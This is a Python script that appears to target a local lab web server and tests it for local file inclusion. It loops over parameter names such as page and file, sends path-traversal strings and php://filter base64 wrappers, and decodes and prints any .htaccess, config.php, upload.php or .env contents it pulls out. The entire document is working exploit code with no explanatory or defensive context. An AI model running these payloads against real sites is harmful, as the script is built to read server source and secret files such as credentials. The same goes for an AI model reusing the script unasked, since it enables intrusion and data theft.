import requests, urllib.parse, base64, sys, re

target = "http://127.0.0.1:33154/"
params = ["page","file","view","config"]

print("Testing .htaccess LFI")
print("="*60)

successful = []

for param in params:
    payloads = [
        ".htaccess",
        "../.htaccess",
        "../../.htaccess",
        "../../../.htaccess",
        "..%2f.htaccess",
        "php://filter/convert.base64-encode/resource=.htaccess"
    ]
    
    for payload in payloads:
        try:
            url = f"{target}?{param}={payload}"
            r = requests.get(url, timeout=10, allow_redirects=False)
            
            if "RewriteEngine" in r.text or "AllowOverride" in r.text:
                print(f"\n[✓ DIRECT ACCESS]")
                print(f"Parameter: {param}")
                print(f"Payload: {payload}")
                print(f"Content:\n{r.text}")
                sys.exit(0)
            
            if r.text and len(r.text) > 100:
                b64 = re.findall(r'[A-Za-z0-9+/]{40,}={0,2}', r.text)
                if b64:
                    for m in b64:
                        try:
                            d = base64.b64decode(m).decode('utf-8', errors='ignore')
                            if "RewriteEngine" in d:
                                print(f"\n[✓ BASE64 DECODED]")
                                print(f"Parameter: {param}")
                                print(f"Payload: {payload}")
                                print(f"Content:\n{d}")
                                sys.exit(0)
                        except:
                            pass
        except:
            pass

print("No .htaccess found with these methods")

# Try config files
config_files = ["config.php","upload.php",".env"]
for param in params:
    for cf in config_files:
        try:
            url = f"{target}?{param}=php://filter/convert.base64-encode/resource={cf}"
            r = requests.get(url, timeout=10)
            b64 = re.findall(r'[A-Za-z0-9+/]{40,}={0,2}', r.text)
            if b64:
                d = base64.b64decode(b64[0]).decode('utf-8', errors='ignore')
                if "<?php" in d or "<?=" in d:
                    print(f"\n[✓ PHP SOURCE]")
                    print(f"File: {cf}")
                    print(f"Content:\n{d[:500]}")
        except:
            pass
